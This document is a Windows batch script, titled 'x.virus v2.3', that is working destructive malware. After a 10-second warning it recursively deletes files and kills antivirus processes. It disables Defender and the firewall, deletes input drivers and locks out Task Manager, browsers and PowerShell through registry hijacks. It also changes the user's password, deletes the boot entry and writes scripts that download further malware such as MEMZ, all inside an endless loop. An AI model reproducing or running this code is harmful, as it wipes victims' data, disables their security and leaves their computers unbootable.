@echo off
cd C:\windows\system32
title x.virus
color 4f
echo ----------
echo x.virus v2.3
echo ----------
echo Tested Windows OS: Windows 8.1/10
echo For: Windows 8/8.1/10
echo Open as administrator permission.
echo ----------
ECHO Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd > warning.txt
start warning.txt
echo Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd
timeout /t 10 /nobreak >nul
echo YOU`VE BEEN HACKED!
ECHO Hello %username%. Your computer has been fucked by x.virus. I put a password on your account, Killed your computer, Turned off recovery mode, cry HAHAHAHAHAHAHA! > README.txt
echo @echo off > filespam.bat
echo :loop >> filespam.bat
echo md hackedbyxvirus^%random^% >> filespam.bat
echo echo x.virus vs ^%username^%^> hackedbyxvirus^%random^%.txt >> filespam.bat
echo goto loop >> filespam.bat
start filespam.bat
start README.txt
net stop "SecurityHealthService"
net stop "Security Center"
netsh firewall set opmode mode=disable
start cmd /k del /s /q **
:: X VIRUS DOWNLOAD BAT
echo @echo off > xvirusdownload.bat
echo curl.exe --output x.virus.cmd --url https://github.com/AliGqmrr/x.virus/raw/refs/heads/main/x.virus.cmd >> xvirusdownload.bat
:: MEMZ DOWNLOAD BAT
echo @echo off > memzdownload.bat
echo curl.exe --output memz.bat --url https://raw.githubusercontent.com/Viper4K/malware/refs/heads/master/MEMZ/MEMZ.bat >> memzdownload.bat
taskkill /F /IM av* 
taskkill /F /IM fire* 
taskkill /F /IM anti* 
taskkill /F /IM spy* 
taskkill /F /IM bullguard* 
taskkill /F /IM PersFw* 
taskkill /F /IM KAV* 
taskkill /F /IM ZONEALARM* 
taskkill /F /IM SAFEWEB* 
taskkill /F /IM OUTPOST* 
taskkill /F /IM nv* 
taskkill /F /IM nav* 
taskkill /F /IM F-* 
taskkill /F /IM ESAFE* 
taskkill /F /IM cle* 
taskkill /F /IM BLACKICE* 
taskkill /F /IM def* 
taskkill /F /IM kav* 
taskkill /F /IM kav* 
taskkill /F /IM avg* 
taskkill /F /IM ash* 
taskkill /F /IM aswupdsv* 
taskkill /F /IM ewid* 
taskkill /F /IM guar* 
taskkill /F /IM gcasDt* 
taskkill /F /IM msmp* 
taskkill /F /IM mcafe* 
taskkill /F /IM mghtml* 
taskkill /F /IM msiexec* 
taskkill /F /IM outpost* 
taskkill /F /IM isafe* 
taskkill /F /IM zap* 
taskkill /F /IM zauinst* 
taskkill /F /IM upd* 
taskkill /F /IM zlclien* 
taskkill /F /IM minilog* 
taskkill /F /IM cc* b 
taskkill /F /IM norton* 
taskkill /F /IM norton au* 
taskkill /F /IM ccc* 
taskkill /F /IM npfmn* 
taskkill /F /IM loge* 
taskkill /F /IM nisum* 
taskkill /F /IM issvc* 
taskkill /F /IM tmp* 
taskkill /F /IM tmn* 
taskkill /F /IM pcc* 
taskkill /F /IM cpd* 
taskkill /F /IM pop* 
taskkill /F /IM pav* 
taskkill /F /IM padmin* 
taskkill /F /IM panda* 
taskkill /F /IM avsch* 
taskkill /F /IM sche* 
taskkill /F /IM syman* 
taskkill /F /IM virus* 
taskkill /F /IM realm* 
taskkill /F /IM sweep* 
taskkill /F /IM scan* 
taskkill /F /IM ad-* 
taskkill /F /IM safe* 
taskkill /F /IM avas* 
taskkill /F /IM norm* 
taskkill /F /IM offg* 
del C:\WINDOWS\system\MOUSE.DRV
del C:\WINDOWS\system\KEYBOARD.DRV
del C:\WINDOWS\system32\drivers\cdrom.sys
reg add HKLM\System\CurrentControlSet\Services\Mouclass/v Start /t REG_DWORD /d4/f > nul
reg add HKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v AntiVirusOverride /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v BingSearchEnabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v CortanaConsent /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Chrome && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Edge && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Firefox && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Opera && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\brave.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Brave && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Internet Explorer && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell ISE && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
taskkill /f /im SearchUI.exe
taskkill /f /im taskmgr.exe
taskkill /f /im powershell.exe
taskkill /f /im powershell_ise.exe
net user %username% hackedbyxvirus%random%
wmic useraccount where name="%username%" rename "hackedbyxvirus%random%"
bcdedit /set {default} recoveryenabled No
bcdedit /delete {current} /f
:loop
    @echo off
    title x.virus
    start cmd /k "mshta "javascript:var sh=new ActiveXObject('WScript.Shell');var result=sh.Popup('still using this computer?',10,'x.virus',36);close();" && exit"
    del C:\WINDOWS\system\MOUSE.DRV
    del C:\WINDOWS\system\KEYBOARD.DRV
    reg add HKLM\System\CurrentControlSet\Services\Mouclass/v Start /t REG_DWORD /d4/f > nul
    reg add HKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v AntiVirusOverride /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v BingSearchEnabled /t REG_DWORD /d 0 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v CortanaConsent /t REG_DWORD /d 0 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoChangeStartMenu /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableChangePassword" /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Chrome && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Edge && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Firefox && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Opera && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\brave.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Brave && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Internet Explorer && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell_ise.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for PowerShell ISE && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Task Manager && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
    net user hackedbyxvirus%random% /add /random /passwordchg:yes
    net user administrator /active:no
    color a
    start explorer
    taskkill /f /im SearchUI.exe
    taskkill /f /IM explorer.exe
    taskkill /f /im powershell.exe
    start curl ascii.live/nyan>nul
    start curl ascii.live/rick>nul
    start curl ascii.live/dvd>nul
    start curl parrot.live>nul
 :: start regedit>nul
    start winver>nul
    start mspaint>nul
::  start taskmgr>nul
    start wscript>nul
    start cleanmgr>nul
    start certmgr>nul
::  start notepad>nul
    start cmd>nul
::  start iexplore>nul
::  start control>nul
    start calc>nul
    start wordpad>nul
    start hh>nul
    start dxdiag>nul
    start mspaint>nul
    start iexpress>nul
    start help>nul
    start helppane>nul
    start winhlp32>nul
    start bfsvc>nul
    color f2
::  netsh interface set interface "Ethernet" admin=disable
    bcdedit /set {default} recoveryenabled No
    bcdedit /delete {current} /f
goto loop
